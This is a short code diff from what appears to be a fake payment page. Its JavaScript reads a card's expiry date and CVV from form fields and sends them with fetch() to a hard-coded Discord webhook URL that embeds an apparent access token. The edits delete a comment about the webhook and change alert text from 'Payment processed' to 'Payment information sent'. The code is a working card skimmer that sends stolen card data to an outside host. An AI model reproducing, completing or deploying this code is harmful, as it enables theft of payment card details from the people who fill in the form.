@@ -87,7 +87,6 @@
             const expiryDate = document.getElementById('expiry-date').value;
             const cvv = document.getElementById('cvv').value;
 
-            // Replace with the appropriate webhook URL
             const webhookUrl = "https://discord.com/api/webhooks/1273279153172512800/v6EO4OBF9zg6lGfm_yndNAoEergAFw85jjZXL8C2Dpbcbl_rRSnUkzqf_AFtv4lR9seC";
 
             fetch(webhookUrl, {
@@ -100,10 +99,10 @@
             })
             .then(response => response.json())
             .then(data => {
-                alert('Payment processed successfully');
+                alert('Payment information sent successfully');
             })
             .catch(error => {
-                alert('Error processing payment');
+                alert('Error sending payment information');
                 console.error('Error:', error);
             });
         });
